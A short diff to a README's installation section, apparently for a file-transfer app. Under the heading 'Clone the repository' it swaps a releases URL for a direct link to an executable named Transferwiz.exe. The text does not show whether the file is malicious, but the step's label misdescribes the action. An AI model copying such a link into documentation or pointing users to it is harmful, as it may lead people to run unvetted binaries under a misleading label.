@@ -27,9 +27,7 @@
 ### Installation
 
 1. **Clone the repository:**
-    ```sh
-    https://github.com/bushwifi/filetransferapp/releases
-    ```
+   [Transferwiz](https://github.com/bushwifi/filetransferapp/releases/download/V1.0.0/Transferwiz.exe)
 
 
 ---
